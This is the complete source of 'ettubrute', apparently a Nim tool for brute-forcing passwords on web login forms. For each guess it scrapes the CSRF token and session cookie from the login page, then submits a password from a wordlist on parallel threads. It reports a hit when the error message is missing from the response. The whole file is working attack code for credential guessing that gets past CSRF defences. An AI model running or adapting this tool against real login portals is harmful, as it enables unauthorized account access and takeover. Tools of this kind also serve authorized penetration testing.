from os import sleep, splitPath; from uri import encodeUrl; from times import epochTime
import httpclient, docopt, strutils, threadpool, system, avxcount, terminal

# banner, args, and variables
enableTrueColors()
let banner = """
               .               .                        .o8                                .             
             .o8             .o8                       "888                              .o8             
  .ooooo.  .o888oo         .o888oo oooo  oooo           888oooo.  oooo d8b oooo  oooo  .o888oo  .ooooo.  
 d88' `88b   888             888   `888  `888           d88' `88b `888""8P `888  `888    888   d88' `88b 
 888ooo888   888   8888888   888    888   888  8888888  888   888  888      888   888    888   888ooo888 
 888    .o   888 .           888 .  888   888           888   888  888      888   888    888 . 888    .o 
 `Y8bod8P'   "888"           "888"  `V88V"V8P'          `Y8bod8P' d888b     `V88V"V8P'   "888" `Y8bod8P' 
                                                                                                         
                                      It's March 15th, Julius CSRF.                                      
                                             Version 1.1                                                 
"""
let doc = """
Usage: ettubrute <login_url> <csrf_htmlname> <wordlist> <postdata_nocsrf> <username> <errormsg> [--speed <spd>]

Options:
  --speed=<spd>  Bruteforce speed, 1-5 [default: 5]."""
let usage = "\nUsage: ettubrute <login_url> <csrf_htmlname> <wordlist> <postdata_nocsrf> <username> <errormsg> [--speed=<spd>]"

var
  login_url: string
  token_name: string
  postdata: string
  wordlist: string
  username: string
  errormsg: string
  brutespeed: int
  timetaken* = epochTime()
  args       = docopt(doc, version = banner)
  sleeptime  = 2
  count*     = 0
  cCount*    = 0

# There's a better way to validate variables using docopt, but I'm fine with this.
try:
  login_url  = $args["<login_url>"]
  token_name = $args["<csrf_htmlname>"]
  wordlist   = $args["<wordlist>"]
  username   = $args["<username>"]
  errormsg   = $args["<errormsg>"]
except:
  setBackgroundColor(bgBlack)
  setForegroundColor(fgWhite, bright=true)
  echo banner
  resetAttributes()
  echo doc
  quit()

try: brutespeed = parseInt($args["--speed"])
except:
  setBackgroundColor(bgBlack)
  setForegroundColor(fgWhite, bright=true)
  echo banner
  resetAttributes()
  echo doc
  quit()
if brutespeed >= 6:
  setBackgroundColor(bgBlack)
  setForegroundColor(fgWhite, bright=true)
  echo banner
  resetAttributes()
  echo doc
  quit()
elif brutespeed == 5: discard
elif brutespeed == 4: sleeptime = 10
elif brutespeed == 3: sleeptime = 20
elif brutespeed == 2: sleeptime = 50
elif brutespeed == 1: sleeptime = 100

# Verify that we know where to inject username and password.
try: postdata   = $args["<postdata_nocsrf>"]
except:
  setBackgroundColor(bgBlack)
  setForegroundColor(fgWhite, bright=true)
  echo banner
  resetAttributes()
  echo doc
  echo "Postdata seems to be invalid."
if "^USER^" in postdata == false or "^PASS^" in postdata == false or token_name in postdata:
  setBackgroundColor(bgBlack)
  setForegroundColor(fgWhite, bright=true)
  echo banner
  resetAttributes()
  write(stdout, " ")
  setBackgroundColor(bgBlack)
  setForegroundColor(fgWhite, bright = true)
  write(stdout, "ERROR ")
  resetAttributes()
  write(stdout, " - Argument 'postdata' must include '^USER^' and '^PASS^', and the token name shouldn't be included.\n")
  quit()

# Trap ctrl+c
proc ctrlc() {.noconv.} =
  if cCount == 1:
    write(stdout, " ")
    setBackgroundColor(bgBlack)
    setForegroundColor(fgWhite, bright = true)
    write(stdout, "Caught CTRL+C")
    resetAttributes()
    write(stdout, "\n")
    echo("Stopped before bruteforce finished.\nRan for " & split($formatFloat(epochTime() - timetaken), ".")[0] & " seconds, tried " & $count & " passwords")
    quit()
  else:
    cCount = 1
    write(stdout, " ")
    setBackgroundColor(bgBlack)
    setForegroundColor(fgWhite, bright = true)
    write(stdout, "Caught CTRL+C")
    resetAttributes()
    write(stdout, "\n")
    sync()
    echo("Stopped before bruteforce finished\nRan for " & split($formatFloat(epochTime() - timetaken), ".")[0] & " seconds, tried " & $count & " passwords")
    quit()

setControlCHook(ctrlc)

# Initialize program
setBackgroundColor(bgBlack)
setForegroundColor(fgWhite, bright=true)
echo banner
resetAttributes()
var linecount = parseInt($fastCount(wordlist)) # Ultrafast linecount for large files using avxcount.nim by aboisvert
echo("Starting file " & splitPath(wordlist).tail & ", " & $linecount & " lines:")

# Define the procedure our threads will run
proc main(loginURL:string,tokenName:string,postData:string,uname:string,pword:string,errorMsg:string,linenum:int):string {.thread.} =
  var
    http  = newHttpClient()
    fetch = http.request(loginURL, httpMethod = HttpGet)
    page0 = rsplit(fetch.body, tokenName, maxsplit = 1)[1] # Chopping up the reply to grab our token
    page1 = split(page0, "=\"", maxsplit = 1)[1]
    token = split(page1, "\">", maxsplit = 1)[0]
    page2:string
    cookie:string
  if "cookie" in $fetch.headers: # Written for single PHP cookie. Might need patching if the server sets many cookies.
    page2  = split($fetch.headers, "\"set-cookie\": @[\"")[1]
    cookie = split(page2, "; ")[0]
  var
    inputData    = postData.replace("^USER^", encodeUrl(uname)).replace("^PASS^", encodeUrl(pword)) & "&" & tokenName & "=" & token
    cookieHeader = newHttpHeaders({"Cookie": cookie})
    response     = http.request(loginURL & "?" & inputData, httpMethod = HttpPost, headers = cookieHeader) # Try password
  echo("  --> " & pword)
  if errorMsg in response.body == false and "field is required." in response.body == false:
    setForegroundColor(fgBlack, bright=true)
    setBackgroundColor(bgGreen)
    write(stdout, "Password seems to have been found! -> " & pword)
    resetAttributes()
    write(stdout, "\n")
    quit()
  close(http)

# Start hurling passwords at the portal in individual threads
for line in lines wordlist:
  if count == linecount:
    echo "[!] Nearing end of list [!]"
  discard spawn main(login_url, token_name, postdata, username, line, errormsg, count)
  count += 1
  sleep(sleeptime)
sync()
echo("\nRan for " & split($formatFloat(epochTime() - timetaken), ".")[0] & " seconds, tried " & $count & " passwords")
